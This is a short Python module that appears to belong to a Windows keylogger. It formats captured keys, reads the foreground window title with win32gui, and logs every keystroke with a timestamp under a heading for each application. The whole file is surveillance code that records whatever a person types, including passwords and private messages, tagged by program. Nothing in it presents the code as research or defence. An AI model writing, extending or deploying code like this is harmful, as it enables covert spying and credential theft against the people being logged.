from datetime import datetime
from storage.file_handler import write_log
import win32gui

_last_window = None

def get_active_window():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

def format_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key}]"

def save_keystroke(key_str):
    global _last_window
    active_window = get_active_window()
    if active_window != _last_window:
        _last_window = active_window
        write_log(f"\n\n=== {active_window} ===\n")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} - {key_str}\n"
    write_log(log_entry)